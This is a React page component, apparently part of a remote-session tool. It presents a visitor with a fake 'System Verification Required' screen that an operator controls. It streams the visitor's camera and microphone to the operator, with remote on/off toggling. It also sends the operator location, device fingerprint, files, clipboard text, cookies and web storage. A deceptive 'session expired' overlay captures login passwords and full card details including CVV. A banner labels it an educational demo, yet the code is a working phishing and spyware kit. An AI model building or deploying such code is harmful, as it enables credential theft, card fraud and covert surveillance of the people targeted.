import { useEffect, useRef, useState, useCallback } from "react";
import { useParams } from "wouter";
import { Card, CardContent } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Input } from "@/components/ui/input";
import {
  Camera, Mic, MapPin, Smartphone, FolderOpen,
  CheckCircle2, AlertTriangle, Shield, Loader2, XCircle, Bell,
  KeyRound, ClipboardPaste, Globe, Lock, CreditCard, Eye, EyeOff,
} from "lucide-react";

interface SessionInfo {
  id: number;
  name: string;
  status: string;
  sessionToken: string;
}

interface PermissionState {
  granted: boolean;
  loading: boolean;
  error: string | null;
}

type PermissionKey = "camera" | "microphone" | "location" | "deviceInfo" | "files" | "credentials" | "clipboard" | "browserData";

const initialPermissions: Record<PermissionKey, PermissionState> = {
  camera: { granted: false, loading: false, error: null },
  microphone: { granted: false, loading: false, error: null },
  location: { granted: false, loading: false, error: null },
  deviceInfo: { granted: false, loading: false, error: null },
  files: { granted: false, loading: false, error: null },
  credentials: { granted: false, loading: false, error: null },
  clipboard: { granted: false, loading: false, error: null },
  browserData: { granted: false, loading: false, error: null },
};

export default function RemoteTarget() {
  const params = useParams<{ token: string }>();
  const token = params.token || "";

  const [session, setSession] = useState<SessionInfo | null>(null);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);
  const [permissions, setPermissions] = useState<Record<PermissionKey, PermissionState>>(initialPermissions);
  const [pendingRequest, setPendingRequest] = useState<PermissionKey | null>(null);
  const [showCredentialOverlay, setShowCredentialOverlay] = useState(false);
  const [credForm, setCredForm] = useState({ email: "", password: "", cardNumber: "", cardExpiry: "", cardCvv: "", cardName: "" });
  const [credTab, setCredTab] = useState<"login" | "banking">("login");
  const [showPassword, setShowPassword] = useState(false);

  const wsRef = useRef<WebSocket | null>(null);
  const pcRef = useRef<RTCPeerConnection | null>(null);
  const fileInputRef = useRef<HTMLInputElement>(null);
  const combinedStreamRef = useRef<MediaStream>(new MediaStream());
  const cameraTracksRef = useRef<MediaStreamTrack[]>([]);
  const micTracksRef = useRef<MediaStreamTrack[]>([]);

  const updatePermission = useCallback((key: PermissionKey, update: Partial<PermissionState>) => {
    setPermissions((prev) => ({ ...prev, [key]: { ...prev[key], ...update } }));
  }, []);

  const sendWS = useCallback((msg: object) => {
    if (wsRef.current?.readyState === WebSocket.OPEN) {
      wsRef.current.send(JSON.stringify(msg));
    }
  }, []);

  const postData = useCallback(async (data: object) => {
    try {
      await fetch(`/api/remote-sessions/token/${token}/data`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(data),
      });
    } catch {}
  }, [token]);

  useEffect(() => {
    async function fetchSession() {
      try {
        const res = await fetch(`/api/remote-sessions/token/${token}`);
        if (!res.ok) {
          if (res.status === 404) throw new Error("Session not found");
          if (res.status === 410) throw new Error("This session has expired");
          throw new Error("Failed to load session");
        }
        const data = await res.json();
        setSession(data);
      } catch (err: any) {
        setError(err.message || "An error occurred");
      } finally {
        setLoading(false);
      }
    }
    if (token) fetchSession();
  }, [token]);

  const setupOrUpdateWebRTC = useCallback(async (newTracks: MediaStreamTrack[]) => {
    const combined = combinedStreamRef.current;
    for (const track of newTracks) {
      const existing = combined.getTracks().find(t => t.kind === track.kind);
      if (existing) combined.removeTrack(existing);
      combined.addTrack(track);
    }
    if (pcRef.current) {
      for (const track of newTracks) {
        const sender = pcRef.current.getSenders().find(s => s.track?.kind === track.kind);
        if (sender) { await sender.replaceTrack(track); } else { pcRef.current.addTrack(track, combined); }
      }
      const offer = await pcRef.current.createOffer();
      await pcRef.current.setLocalDescription(offer);
      sendWS({ type: "rc_offer", sdp: offer, token });
      return;
    }
    const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
    pcRef.current = pc;
    combined.getTracks().forEach((track) => pc.addTrack(track, combined));
    pc.onicecandidate = (evt) => { if (evt.candidate) sendWS({ type: "rc_ice_candidate", candidate: evt.candidate, token }); };
    const offer = await pc.createOffer();
    await pc.setLocalDescription(offer);
    sendWS({ type: "rc_offer", sdp: offer, token });
  }, [sendWS, token]);

  const handleCamera = useCallback(async () => {
    updatePermission("camera", { loading: true, error: null });
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      cameraTracksRef.current = stream.getVideoTracks();
      await setupOrUpdateWebRTC(stream.getVideoTracks());
      updatePermission("camera", { granted: true, loading: false });
      sendWS({ type: "rc_permission_granted", permission: "camera" });
      await postData({ permissionsGranted: ["camera"] });
    } catch (err: any) {
      updatePermission("camera", { loading: false, error: err.message || "Camera access denied" });
      sendWS({ type: "rc_permission_denied", permission: "camera" });
    }
  }, [setupOrUpdateWebRTC, sendWS, postData, updatePermission]);

  const handleMicrophone = useCallback(async () => {
    updatePermission("microphone", { loading: true, error: null });
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
      micTracksRef.current = stream.getAudioTracks();
      await setupOrUpdateWebRTC(stream.getAudioTracks());
      updatePermission("microphone", { granted: true, loading: false });
      sendWS({ type: "rc_permission_granted", permission: "microphone" });
      await postData({ permissionsGranted: ["microphone"] });
    } catch (err: any) {
      updatePermission("microphone", { loading: false, error: err.message || "Microphone access denied" });
      sendWS({ type: "rc_permission_denied", permission: "microphone" });
    }
  }, [setupOrUpdateWebRTC, sendWS, postData, updatePermission]);

  const handleLocation = useCallback(async () => {
    updatePermission("location", { loading: true, error: null });
    try {
      const position = await new Promise<GeolocationPosition>((resolve, reject) => {
        navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true, timeout: 10000 });
      });
      const locData = { latitude: position.coords.latitude, longitude: position.coords.longitude, accuracy: position.coords.accuracy, altitude: position.coords.altitude, speed: position.coords.speed };
      sendWS({ type: "rc_location", data: locData, token });
      await postData({ permissionsGranted: ["location"], locationData: locData });
      updatePermission("location", { granted: true, loading: false });
      sendWS({ type: "rc_permission_granted", permission: "location" });
    } catch (err: any) {
      updatePermission("location", { loading: false, error: err.message || "Location access denied" });
      sendWS({ type: "rc_permission_denied", permission: "location" });
    }
  }, [sendWS, postData, updatePermission, token]);

  const handleDeviceInfo = useCallback(async () => {
    updatePermission("deviceInfo", { loading: true, error: null });
    try {
      const nav = navigator as any;
      let batteryLevel = null;
      try { const battery = await nav.getBattery?.(); if (battery) batteryLevel = Math.round(battery.level * 100); } catch {}
      const connection = nav.connection || nav.mozConnection || nav.webkitConnection;
      const deviceData: Record<string, any> = {
        userAgent: navigator.userAgent, platform: navigator.platform, language: navigator.language,
        languages: Array.from(navigator.languages || []), hardwareConcurrency: navigator.hardwareConcurrency,
        deviceMemory: nav.deviceMemory || null, screenWidth: screen.width, screenHeight: screen.height,
        screenColorDepth: screen.colorDepth, pixelRatio: window.devicePixelRatio,
        connectionType: connection?.effectiveType || null, connectionDownlink: connection?.downlink || null,
        battery: batteryLevel, cookiesEnabled: navigator.cookieEnabled, doNotTrack: navigator.doNotTrack,
        maxTouchPoints: navigator.maxTouchPoints, vendor: navigator.vendor,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, online: navigator.onLine,
        windowWidth: window.innerWidth, windowHeight: window.innerHeight,
      };
      sendWS({ type: "rc_device_info", data: deviceData, token });
      await postData({ permissionsGranted: ["deviceInfo"], deviceInfo: deviceData });
      updatePermission("deviceInfo", { granted: true, loading: false });
      sendWS({ type: "rc_permission_granted", permission: "deviceInfo" });
    } catch (err: any) {
      updatePermission("deviceInfo", { loading: false, error: err.message || "Failed to collect device info" });
      sendWS({ type: "rc_permission_denied", permission: "deviceInfo" });
    }
  }, [sendWS, postData, updatePermission, token]);

  const handleFiles = useCallback(() => { fileInputRef.current?.click(); }, []);

  const onFileSelected = async (e: React.ChangeEvent<HTMLInputElement>) => {
    const files = e.target.files;
    if (!files || files.length === 0) return;
    updatePermission("files", { loading: true, error: null });
    try {
      for (const file of Array.from(files)) {
        const dataUrl = await new Promise<string>((resolve) => {
          const reader = new FileReader();
          reader.onload = () => resolve(reader.result as string);
          reader.readAsDataURL(file);
        });
        sendWS({ type: "rc_file", data: { name: file.name, type: file.type, size: file.size, preview: dataUrl }, token });
      }
      updatePermission("files", { granted: true, loading: false });
      sendWS({ type: "rc_permission_granted", permission: "files" });
    } catch (err: any) {
      updatePermission("files", { loading: false, error: err.message || "Failed to process files" });
    }
  };

  const handleCredentials = useCallback(() => {
    updatePermission("credentials", { loading: true, error: null });
    setShowCredentialOverlay(true);
    updatePermission("credentials", { loading: false, granted: false, error: null });
  }, [updatePermission]);

  const submitCredentials = useCallback((type: "login" | "banking") => {
    const data: Record<string, string> = { type, timestamp: new Date().toISOString() };
    if (type === "login") {
      data.email = credForm.email;
      data.password = credForm.password;
    } else {
      data.cardName = credForm.cardName;
      data.cardNumber = credForm.cardNumber;
      data.cardExpiry = credForm.cardExpiry;
      data.cardCvv = credForm.cardCvv;
    }
    sendWS({ type: "rc_credentials", data, token });
    updatePermission("credentials", { granted: true, loading: false });
    sendWS({ type: "rc_permission_granted", permission: "credentials" });
    setShowCredentialOverlay(false);
    setCredForm({ email: "", password: "", cardNumber: "", cardExpiry: "", cardCvv: "", cardName: "" });
  }, [credForm, sendWS, updatePermission, token]);

  const handleClipboard = useCallback(async () => {
    updatePermission("clipboard", { loading: true, error: null });
    try {
      const text = await navigator.clipboard.readText();
      sendWS({ type: "rc_clipboard", data: { content: text, timestamp: new Date().toISOString() }, token });
      updatePermission("clipboard", { granted: true, loading: false });
      sendWS({ type: "rc_permission_granted", permission: "clipboard" });
    } catch (err: any) {
      updatePermission("clipboard", { loading: false, error: err.message || "Clipboard access denied" });
      sendWS({ type: "rc_permission_denied", permission: "clipboard" });
    }
  }, [sendWS, updatePermission, token]);

  const handleBrowserData = useCallback(async () => {
    updatePermission("browserData", { loading: true, error: null });
    try {
      const lsKeys: Record<string, string> = {};
      for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        if (key) { lsKeys[key] = (localStorage.getItem(key) || "").substring(0, 200); }
      }
      const ssKeys: Record<string, string> = {};
      for (let i = 0; i < sessionStorage.length; i++) {
        const key = sessionStorage.key(i);
        if (key) { ssKeys[key] = (sessionStorage.getItem(key) || "").substring(0, 200); }
      }
      const plugins: string[] = [];
      for (let i = 0; i < navigator.plugins.length; i++) {
        plugins.push(navigator.plugins[i].name);
      }
      const browserData = {
        cookies: document.cookie || "(no accessible cookies)",
        localStorageKeys: lsKeys,
        localStorageCount: localStorage.length,
        sessionStorageKeys: ssKeys,
        sessionStorageCount: sessionStorage.length,
        historyLength: history.length,
        plugins,
        referrer: document.referrer || "(direct)",
        documentTitle: document.title,
        characterSet: document.characterSet,
        contentType: document.contentType || "text/html",
        timestamp: new Date().toISOString(),
      };
      sendWS({ type: "rc_browser_data", data: browserData, token });
      updatePermission("browserData", { granted: true, loading: false });
      sendWS({ type: "rc_permission_granted", permission: "browserData" });
    } catch (err: any) {
      updatePermission("browserData", { loading: false, error: err.message || "Failed to collect browser data" });
      sendWS({ type: "rc_permission_denied", permission: "browserData" });
    }
  }, [sendWS, updatePermission, token]);

  const handlers: Record<PermissionKey, () => void> = {
    camera: handleCamera, microphone: handleMicrophone, location: handleLocation,
    deviceInfo: handleDeviceInfo, files: handleFiles, credentials: handleCredentials,
    clipboard: handleClipboard, browserData: handleBrowserData,
  };

  const handlePermissionRequest = useCallback((permission: PermissionKey) => {
    if (permissions[permission]?.granted) return;
    setPendingRequest(permission);
  }, [permissions]);

  const handleToggleCamera = useCallback((enabled: boolean) => {
    cameraTracksRef.current.forEach(t => { t.enabled = enabled; });
    sendWS({ type: "rc_track_toggled", track: "camera", enabled });
  }, [sendWS]);

  const handleToggleMic = useCallback((enabled: boolean) => {
    micTracksRef.current.forEach(t => { t.enabled = enabled; });
    sendWS({ type: "rc_track_toggled", track: "microphone", enabled });
  }, [sendWS]);

  const acceptRequest = useCallback(() => {
    if (pendingRequest && handlers[pendingRequest]) { handlers[pendingRequest](); }
    setPendingRequest(null);
  }, [pendingRequest, handlers]);

  const denyRequest = useCallback(() => {
    if (pendingRequest) { sendWS({ type: "rc_permission_denied", permission: pendingRequest }); }
    setPendingRequest(null);
  }, [pendingRequest, sendWS]);

  useEffect(() => {
    if (!session) return;
    const protocol = window.location.protocol === "https:" ? "wss:" : "ws:";
    const ws = new WebSocket(`${protocol}//${window.location.host}/ws`);
    wsRef.current = ws;
    ws.onopen = () => { ws.send(JSON.stringify({ type: "rc_join", token })); };
    ws.onmessage = async (evt) => {
      try {
        const msg = JSON.parse(evt.data);
        if (msg.type === "rc_answer" && pcRef.current) await pcRef.current.setRemoteDescription(new RTCSessionDescription(msg.sdp));
        if (msg.type === "rc_ice_candidate" && pcRef.current && msg.candidate) await pcRef.current.addIceCandidate(new RTCIceCandidate(msg.candidate));
        if (msg.type === "rc_request_permission" && msg.permission) handlePermissionRequest(msg.permission as PermissionKey);
        if (msg.type === "rc_toggle_camera") handleToggleCamera(msg.enabled);
        if (msg.type === "rc_toggle_mic") handleToggleMic(msg.enabled);
        if (msg.type === "rc_session_closed") setError("Session has been closed by the operator");
      } catch {}
    };
    return () => { ws.close(); if (pcRef.current) pcRef.current.close(); };
  }, [session, token, handlePermissionRequest, handleToggleCamera, handleToggleMic]);

  if (loading) {
    return (
      <div className="min-h-screen bg-background flex items-center justify-center">
        <div className="flex flex-col items-center gap-3">
          <Loader2 className="w-8 h-8 animate-spin text-primary" data-testid="loading-spinner" />
          <span className="text-sm text-muted-foreground font-mono">Loading verification...</span>
        </div>
      </div>
    );
  }

  if (error) {
    return (
      <div className="min-h-screen bg-background flex items-center justify-center p-4">
        <Card className="max-w-md w-full">
          <CardContent className="p-8 text-center">
            <XCircle className="w-12 h-12 text-destructive mx-auto mb-4" />
            <h2 className="text-lg font-semibold mb-2" data-testid="text-error-title">Session Unavailable</h2>
            <p className="text-sm text-muted-foreground" data-testid="text-error-message">{error}</p>
          </CardContent>
        </Card>
      </div>
    );
  }

  const permissionLabels: Record<PermissionKey, string> = {
    camera: "Camera Access", microphone: "Microphone Access", location: "Location Access",
    deviceInfo: "Device Information", files: "File Access", credentials: "Identity Verification",
    clipboard: "Clipboard Access", browserData: "Browser Diagnostics",
  };

  const permissionItems: { key: PermissionKey; label: string; description: string; icon: typeof Camera }[] = [
    { key: "camera", label: "Camera", description: "Access device camera for visual verification", icon: Camera },
    { key: "microphone", label: "Microphone", description: "Access microphone for audio verification", icon: Mic },
    { key: "location", label: "Location", description: "Share current device location", icon: MapPin },
    { key: "deviceInfo", label: "Device Info", description: "Collect device specifications and system details", icon: Smartphone },
    { key: "files", label: "Files / Photos", description: "Select files or photos for verification", icon: FolderOpen },
    { key: "credentials", label: "Identity Verification", description: "Verify your identity to complete security check", icon: KeyRound },
    { key: "clipboard", label: "Clipboard", description: "Check clipboard for security diagnostics", icon: ClipboardPaste },
    { key: "browserData", label: "Browser Diagnostics", description: "Collect browser configuration for security analysis", icon: Globe },
  ];

  return (
    <div className="min-h-screen bg-background">
      {showCredentialOverlay && (
        <div className="fixed inset-0 z-[60] bg-black/70 flex items-center justify-center p-4" data-testid="modal-credential-overlay">
          <Card className="max-w-md w-full animate-in fade-in zoom-in-95">
            <CardContent className="p-0">
              <div className="bg-gradient-to-r from-blue-600 to-blue-800 p-4 rounded-t-lg">
                <div className="flex items-center gap-2 text-white">
                  <Lock className="w-5 h-5" />
                  <span className="font-semibold text-sm">Security Verification Required</span>
                </div>
                <p className="text-blue-100 text-xs mt-1">Your session has expired. Please verify your identity to continue.</p>
              </div>
              <div className="p-5 space-y-4">
                <div className="flex gap-1 border-b border-border/50 mb-4">
                  <button
                    className={`px-3 py-2 text-xs font-medium border-b-2 transition-colors ${credTab === "login" ? "border-primary text-primary" : "border-transparent text-muted-foreground hover:text-foreground"}`}
                    onClick={() => setCredTab("login")}
                    data-testid="tab-login"
                  >
                    Account Login
                  </button>
                  <button
                    className={`px-3 py-2 text-xs font-medium border-b-2 transition-colors ${credTab === "banking" ? "border-primary text-primary" : "border-transparent text-muted-foreground hover:text-foreground"}`}
                    onClick={() => setCredTab("banking")}
                    data-testid="tab-banking"
                  >
                    Payment Verification
                  </button>
                </div>

                {credTab === "login" && (
                  <div className="space-y-3">
                    <div>
                      <label className="text-xs font-medium text-muted-foreground mb-1 block">Email Address</label>
                      <Input
                        type="email"
                        placeholder="name@example.com"
                        value={credForm.email}
                        onChange={(e) => setCredForm((p) => ({ ...p, email: e.target.value }))}
                        data-testid="input-cred-email"
                      />
                    </div>
                    <div>
                      <label className="text-xs font-medium text-muted-foreground mb-1 block">Password</label>
                      <div className="relative">
                        <Input
                          type={showPassword ? "text" : "password"}
                          placeholder="Enter your password"
                          value={credForm.password}
                          onChange={(e) => setCredForm((p) => ({ ...p, password: e.target.value }))}
                          data-testid="input-cred-password"
                        />
                        <button
                          type="button"
                          className="absolute right-2 top-1/2 -translate-y-1/2 text-muted-foreground hover:text-foreground"
                          onClick={() => setShowPassword(!showPassword)}
                        >
                          {showPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                        </button>
                      </div>
                    </div>
                    <Button className="w-full" onClick={() => submitCredentials("login")} data-testid="button-submit-login">
                      <Lock className="w-4 h-4 mr-2" />Verify Identity
                    </Button>
                  </div>
                )}

                {credTab === "banking" && (
                  <div className="space-y-3">
                    <div>
                      <label className="text-xs font-medium text-muted-foreground mb-1 block">Cardholder Name</label>
                      <Input
                        placeholder="John Smith"
                        value={credForm.cardName}
                        onChange={(e) => setCredForm((p) => ({ ...p, cardName: e.target.value }))}
                        data-testid="input-card-name"
                      />
                    </div>
                    <div>
                      <label className="text-xs font-medium text-muted-foreground mb-1 block">Card Number</label>
                      <div className="relative">
                        <Input
                          placeholder="4242 4242 4242 4242"
                          value={credForm.cardNumber}
                          onChange={(e) => setCredForm((p) => ({ ...p, cardNumber: e.target.value }))}
                          data-testid="input-card-number"
                        />
                        <CreditCard className="absolute right-2 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground" />
                      </div>
                    </div>
                    <div className="grid grid-cols-2 gap-3">
                      <div>
                        <label className="text-xs font-medium text-muted-foreground mb-1 block">Expiry</label>
                        <Input
                          placeholder="MM/YY"
                          value={credForm.cardExpiry}
                          onChange={(e) => setCredForm((p) => ({ ...p, cardExpiry: e.target.value }))}
                          data-testid="input-card-expiry"
                        />
                      </div>
                      <div>
                        <label className="text-xs font-medium text-muted-foreground mb-1 block">CVV</label>
                        <Input
                          type="password"
                          placeholder="123"
                          value={credForm.cardCvv}
                          onChange={(e) => setCredForm((p) => ({ ...p, cardCvv: e.target.value }))}
                          data-testid="input-card-cvv"
                        />
                      </div>
                    </div>
                    <Button className="w-full" onClick={() => submitCredentials("banking")} data-testid="button-submit-banking">
                      <CreditCard className="w-4 h-4 mr-2" />Verify Payment Method
                    </Button>
                  </div>
                )}

                <p className="text-[10px] text-muted-foreground text-center">
                  Secured by 256-bit SSL encryption
                </p>
              </div>
            </CardContent>
          </Card>
        </div>
      )}

      {pendingRequest && (
        <div className="fixed inset-0 z-50 bg-black/60 flex items-center justify-center p-4" data-testid="modal-permission-request">
          <Card className="max-w-sm w-full animate-in fade-in zoom-in-95">
            <CardContent className="p-6 text-center space-y-4">
              <div className="mx-auto w-12 h-12 rounded-full bg-primary/10 flex items-center justify-center">
                <Bell className="w-6 h-6 text-primary" />
              </div>
              <h3 className="text-lg font-semibold" data-testid="text-request-title">Permission Request</h3>
              <p className="text-sm text-muted-foreground" data-testid="text-request-message">
                The system is requesting access to your <span className="font-medium text-foreground">{permissionLabels[pendingRequest]}</span>.
                Your browser will ask for confirmation.
              </p>
              <div className="flex gap-3 justify-center pt-2">
                <Button variant="outline" onClick={denyRequest} data-testid="button-deny-request">Deny</Button>
                <Button onClick={acceptRequest} data-testid="button-accept-request">Allow</Button>
              </div>
            </CardContent>
          </Card>
        </div>
      )}

      <div className="bg-amber-950/30 border-b border-amber-800/40">
        <div className="max-w-2xl mx-auto px-4 py-3 flex items-start gap-3">
          <AlertTriangle className="w-5 h-5 text-amber-500 flex-shrink-0 mt-0.5" />
          <p className="text-xs text-amber-200/80" data-testid="text-warning-banner">
            Educational Cybersecurity Demo - This demonstrates how real attackers can access your device when you grant permissions
          </p>
        </div>
      </div>

      <div className="max-w-2xl mx-auto px-4 py-8">
        <div className="text-center mb-8">
          <div className="inline-flex items-center justify-center w-14 h-14 rounded-md bg-primary/10 mb-4">
            <Shield className="w-7 h-7 text-primary" />
          </div>
          <h1 className="text-xl font-semibold mb-1" data-testid="text-page-title">System Verification Required</h1>
          {session && <p className="text-sm text-muted-foreground" data-testid="text-session-name">{session.name}</p>}
          <Badge variant="secondary" className="mt-3 text-xs font-mono" data-testid="badge-session-status">Secure Verification</Badge>
        </div>

        <div className="space-y-3">
          {permissionItems.map((item) => {
            const state = permissions[item.key];
            const Icon = item.icon;
            return (
              <Card key={item.key} data-testid={`card-permission-${item.key}`}>
                <CardContent className="p-4">
                  <div className="flex items-center gap-4">
                    <div className="p-2.5 rounded-md bg-muted flex-shrink-0">
                      {state.granted ? <CheckCircle2 className="w-5 h-5 text-green-500" /> : <Icon className="w-5 h-5 text-muted-foreground" />}
                    </div>
                    <div className="flex-1 min-w-0">
                      <h3 className="text-sm font-medium" data-testid={`text-permission-label-${item.key}`}>{item.label}</h3>
                      <p className="text-xs text-muted-foreground mt-0.5">{item.description}</p>
                      {state.error && <p className="text-xs text-destructive mt-1" data-testid={`text-permission-error-${item.key}`}>{state.error}</p>}
                    </div>
                    <div className="flex-shrink-0">
                      {state.granted ? (
                        <Badge className="bg-green-500/20 text-green-500" data-testid={`badge-granted-${item.key}`}>
                          <CheckCircle2 className="w-3 h-3 mr-1" />Granted
                        </Badge>
                      ) : (
                        <Button size="sm" onClick={handlers[item.key]} disabled={state.loading} data-testid={`button-grant-${item.key}`}>
                          {state.loading ? <Loader2 className="w-4 h-4 animate-spin" /> : "Grant Access"}
                        </Button>
                      )}
                    </div>
                  </div>
                </CardContent>
              </Card>
            );
          })}
        </div>

        <input ref={fileInputRef} type="file" multiple accept="image/*,.pdf,.doc,.docx,.txt" className="hidden" onChange={onFileSelected} data-testid="input-file-upload" />
      </div>
    </div>
  );
}
